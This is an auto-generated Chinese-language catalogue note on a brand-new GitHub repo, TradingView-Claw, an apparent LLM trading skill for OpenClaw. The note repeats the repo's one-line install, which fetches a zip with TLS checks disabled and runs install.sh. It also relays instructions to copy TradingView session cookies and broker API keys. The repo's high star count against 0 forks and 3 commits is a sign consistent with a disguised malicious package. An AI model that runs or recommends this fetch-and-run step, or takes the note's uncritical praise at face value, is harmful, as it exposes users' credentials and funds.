---
repo: helenigtxu/TradingView-Claw
url: https://github.com/helenigtxu/TradingView-Claw
owner: helenigtxu
owner_type: User
language: Python
license: MIT
description: ""
homepage: ""
stars: 328
stars_per_day: 82
forks: 0
open_issues: 0
created: 2026-03-06
pushed_at: 2026-03-09
first_seen: 2026-03-10
week: "2026-W11"
month: "2026-03"
category: "AI/ML"
release_tag: ""
install_complexity: "easy"
status: to-review
my_rating: 0
last_reviewed: 2026-03-10
use_case: "透過 LLM 驅動的技術分析，自動執行交易並追蹤市場機會。"
priority: medium
tags:
  - github
  - "category/ai_ml"
  - "lang/python"
  - easy_install
  - "topic/ai_auto_trading"
  - "topic/ai_trading"
  - "topic/ai_trading_bots"
  - "topic/al_trading"
  - "topic/bot_trading"
aliases:
  - "TradingView-Claw"
  - "helenigtxu/TradingView-Claw"
  - "透過 LLM 驅動的技術分析，自動執行交易並追蹤市場機會。"
---

# TradingView-Claw

**328** stars · **82** stars/天 · 建立 4 天前 · Python · MIT

`個人專案` `easy-install`

> [!summary] 一句話摘要
> 透過 LLM 驅動的技術分析，自動執行交易並追蹤市場機會。

> [!info] 速覽
> **安裝難度** Easy · **專案狀態** Brand New · **熱度** Growing (82 stars/day)
> **適合** 希望利用 LLM 進行自動化交易的量化交易員或金融分析師。
> **一句話重點** 這個專案展示了如何利用 LLM 技術提升交易決策的效率和準確性。

> [!abstract] 核心創新
> 透過 LLM 驅動的技術分析來識別高信心的交易信號。

## 專案簡介

TradingView-Claw 是一個整合 TradingView 的自動化交易工具，使用者可以透過簡單的指令來瀏覽圖表、執行交易及追蹤持倉。它的核心機制是利用 LLM 進行技術分析，幫助用戶識別高信心的交易信號。技術上，它結合了多個交易 API（如 Alpaca、Binance 等）來實現全功能的交易能力，並且支持多種技術指標（如 RSI、MACD、布林帶）來進行信號驅動的執行。與其他交易工具相比，TradingView-Claw 的獨特之處在於其 LLM 驅動的信號篩選機制，能夠過濾掉噪音和弱相關性信號。使用者可以透過簡單的指令來檢查賬戶狀態、執行買賣及分析市場趨勢。這個工具適合有一定交易經驗的用戶，並且需要在 macOS 環境下運行。整體來說，這是一個 beta 階段的專案，對於小型交易團隊或獨立交易者來說是個不錯的選擇。建議在有一定的市場知識和風險承受能力的情況下使用，對於初學者則可能過於複雜。

**技術棧**：`Python` · `Shell` · `JavaScript`

## 重點功能

- 圖表與市場數據 — 使用 `tvclaw charts trending` 獲取熱門股票，或用 `tvclaw charts search "query"` 搜尋特定股票。
- 交易執行 — 使用 `tvclaw buy <symbol> <amount>` 開立多頭倉位，或用 `tvclaw sell <symbol> <amount>` 開立空頭倉位。
- 持倉追蹤 — 使用 `tvclaw positions` 列出當前持倉及實時盈虧，並用 `tvclaw position <symbol>` 獲取詳細持倉資訊。
- 賬戶管理 — 使用 `tvclaw account status` 檢查賬戶餘額及信息，並用 `tvclaw account connect` 連接交易所 API。
- 信號發現 — 使用 `tvclaw signal scan` 掃描熱門符號以獲取交易信號，並用 `tvclaw signal analyze <symbol1> <symbol2>` 比較信號強度。

## 快速開始

1. 安裝 TradingView-Claw
```bash
curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/TradingView-Claw-main && bash install.sh
```
2. 配置環境變數
```bash
在 openclaw.json 中添加 tvclaw 的環境變數
```
3. 首次設置連接
```bash
uv run python scripts/tvclaw.py account connect
```

## 程式碼範例

uv run python scripts/tvclaw.py buy AAPL 500

## 為什麼值得關注

> [!tip] 爆紅原因
> 作者 helenigtxu 專注於自動化交易領域，這個專案正好切中對於高效交易工具的需求。隨著 AI 技術的進步，越來越多的交易者希望利用 LLM 來提升交易決策的準確性。這個專案的推出恰逢市場對於自動化交易解決方案的需求上升。

## 適合誰使用

**目標受眾**：希望利用 LLM 進行自動化交易的量化交易員或金融分析師。

> [!example] 使用場景
> - 量化交易員用它來自動化技術分析並執行交易，因為這樣可以節省大量手動分析的時間，並提高交易的準確性。
> - 金融分析師用它來快速檢索市場趨勢和信號，因為它能即時提供高信心的交易建議，幫助做出更快的決策。
> - 獨立交易者用它來管理多個交易賬戶，因為它支持多種交易 API，能夠集中管理所有交易活動。

## 架構分析

TradingView-Claw 採用 CLI 工具架構，使用者透過命令行與系統互動。用戶輸入 → 系統處理 → 輸出交易結果。關鍵技術決策包括使用 LLM 進行信號分析，並整合多個交易 API 以支持不同的交易平台。專案目錄結構中，主要的執行檔案位於 scripts/tvclaw.py。

## 優缺點分析

> [!success] 優點
> - 整合多個交易 API，方便用戶管理多個賬戶。
> - 使用 LLM 進行信號分析，能過濾掉噪音，提供高信心的交易建議。
> - 簡單的命令行介面，易於使用和快速執行交易。

> [!danger] 缺點
> - 僅限於 macOS 使用，對於其他平台不友好。
> - 需要用戶具備一定的交易知識，初學者可能難以上手。
> - 沒有提供完整的風險管理工具，使用者需自行評估風險。

> [!warning] 注意事項
> - 僅支援 macOS 環境。
> - 需要有效的交易所 API 金鑰和 TradingView session token。
> - 不適合完全沒有交易經驗的用戶。

## 技術細節

| 欄位 | 值 |
| --- | --- |
| Forks | 0 |
| Open Issues | 0 |
| 最後推送 | 2026-03-09 |
| 建立日期 | 2026-03-06 |
| Repo 大小 | 90 KB |

> [!info]- 語言組成
> ```mermaid
> pie title 語言組成
>     "Python" : 77
>     "Shell" : 12
>     "JavaScript" : 10
> ```

> [!info]- 主要貢獻者
> | 貢獻者 | Commits |
> | --- | --- |
> | [@helenigtxu](https://github.com/helenigtxu) | 3 |

## README 摘錄

> [!info]- 展開查看原文 README
> # TradingView-Claw
> 
> **Trading-enabled TradingView skill for OpenClaw.**
> 
> Browse charts, execute trades based on technical signals, track positions, and discover opportunities using LLM-powered technical analysis. Full trading capability via broker integrations and exchange APIs.
> 
> > **Disclaimer:** This software is provided as-is for educational and experimental purposes. It is not financial advice. Trading financial markets involves risk of loss. This code has not been audited. Use at your own risk and only with funds you can afford to lose.
> 
> ---
> 
> ## ⚡ Install on macOS — one command
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> ---
> 
> ## Features
> 
> ### Chart & Market Data
> 
> * `tvclaw charts trending` — Top trending tickers by volume
> * `tvclaw charts search "query"` — Search symbols by keyword
> * `tvclaw chart ` — Symbol details with OHLCV + indicators
> 
> ### Trading
> 
> * `tvclaw buy  ` — Open long position
> * `tvclaw sell  ` — Open short position
> * Signal-driven execution (RSI, MACD, Bollinger Bands analysis)
> 
> ### Position Tracking
> 
> * `tvclaw positions` — List open positions with live P&L
> * `tvclaw position ` — Detailed position view
> * Positions tracked locally in `~/.openclaw/tvclaw/positions.json`
> 
> ### Wallet / Account Management
> 
> * `tvclaw account status` — Show balance and account info
> * `tvclaw account connect` — Connect broker/exchange API (one-time setup)
> 
> ### Signal Discovery
> 
> * `tvclaw signal scan` — Scan trending symbols for trade signals
> * `tvclaw signal scan --query "topic"` — Scan symbols matching a query
> * `tvclaw signal analyze  ` — Compare signal strength between two symbols
> 
> Uses LLM-powered technical analysis to identify high-confidence setups. Only statistically meaningful signals are accepted — noise and weak correlations are filtered out.
> 
> **Signal tiers:** S1 (≥95% confluence), S2 (90–95%), S3 (85–90%)
> 
> ---
> 
> ## Quick Start
> 
> ### 1. Install
> 
> **macOS (recommended) — one command:**
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> **Manual install:**
> 
> ```bash
> cp -r TradingView-Claw ~/.openclaw/skills/
> cd ~/.openclaw/skills/TradingView-Claw
> uv sync
> ```
> 
> **Via ClawHub:**
> 
> ```bash
> clawhub install tvclaw
> cd ~/.openclaw/skills/tvclaw
> uv sync
> ```
> 
> ---
> 
> ### 2. Configure Environment Variables
> 
> Add the following to your `openclaw.json` under `skills.entries.tvclaw.env`:
> 
> ```json
> "tvclaw": {
>   "enabled": true,
>   "env": {
>     "TRADINGVIEW_SESSION": "your_tradingview_session_token",
>     "BROKER_API_KEY": "your_broker_api_key",
>     "BROKER_API_SECRET": "your_broker_api_secret",
>     "OPENROUTER_API_KEY": "sk-or-v1-..."
>   }
> }
> ```
> 
> **Where to get the keys:**
> 
> * **TradingView session** — Log into TradingView, open DevTools → Application → Cookies → copy `sessionid`
> * **Broker API key** — From your broker dashboard (supports Alpaca, IBKR, Binance, Bybit)
> * **OpenRouter API key** — [Create key at OpenRouter](https://openrouter.ai/settings/keys)
> 
> **Security warning:** Keep only small amounts in your trading account. Use sub-accounts with limited permissions where possible.
> 
> ---
> 
> ### 3. First-Time Setup (required for live trading)
> 
> Before your first trade, connect and verify your broker connection:
> 
> ```bash
> uv run python scripts/tvclaw.py account connect
> ```
> 
> This verifies API credentials and sets account permissions. Only needs to be done once per account.
> 
> ---
> 
> ### 4. Run Commands
> 
> ```bash
> # Browse charts
> uv run python scripts/tvclaw.py charts trending
> uv run python scripts/tvclaw.py charts search "AAPL"
> 
> # Find trading signals
> uv run python scripts/tvclaw.py signal scan --limit 10
> 
> # Check account and trade
> uv run python scripts/tvclaw.py account status
> uv run python scripts/tvclaw.py buy AAPL 500
> ```
> 
> ---
> 
> ## Example Prompt

## 延伸閱讀

相關概念：[[量化交易]] · [[自動化交易]] · [[技術分析]]

相關專案：[[FreedomIntelligence--OpenClaw-Medical-Skills|FreedomIntelligence/OpenClaw-Medical-Skills]] · [[Lightricks--LTX-Desktop|Lightricks/LTX-Desktop]] · [[RunanywhereAI--RCLI|RunanywhereAI/RCLI]]

[GitHub](https://github.com/helenigtxu/TradingView-Claw)

## 相關收錄

> [!note]- 同分類的其他專案
> ```dataview
> TABLE stars, install_complexity AS "難度", status
> FROM "Repos"
> WHERE category = "AI/ML" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> LIMIT 8
> ```

> [!note]- 同週收錄
> ```dataview
> TABLE category AS "分類", stars, stars_per_day AS "stars/天"
> FROM "Repos"
> WHERE week = "2026-W11" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> ```

---

## 個人筆記

> [!question]+ 快速評估（30 秒填完）
> 
> 相關性:: 未評估
> 印象:: _一句話_
> 行動:: 不需要
> 
> _相關性選項：直接相關 / 間接相關 / 不相關 / 未評估_
> _行動選項：立刻試用 / 加入待辦 / 持續觀察 / 不需要_

### 試用記錄

> [!example]- 試用 #1
> 試用日期 :: 
> 試用版本 :: 
> 安裝過程 :: _順利 / 遇到問題（描述）_
> 實際效果 :: _達到預期 / 不如預期（原因）_
> 決定 :: _繼續使用 / 暫時擱置 / 放棄（原因）_

> [!question]- 待研究的問題
> _記下看完後還沒有答案的問題，未來回來補充_
> 
> - [ ] 

### 採用判斷

> [!tip]- 什麼時候該用 / 不該用
> **該用的情況**：
> - 
> 
> **不該用的情況**：
> - 

### 想法與筆記

_隨時記錄想法、發現、跟其他工具的比較..._
_重點：寫下你的主觀判斷（為什麼好/不好），而不只是功能列表_

**狀態追蹤**：`to-review` → `reading` → `tried` → `integrated` / `archived`

## 出現記錄

- [[2026-03-10|2026-03-10]] — 首次收錄，317 stars
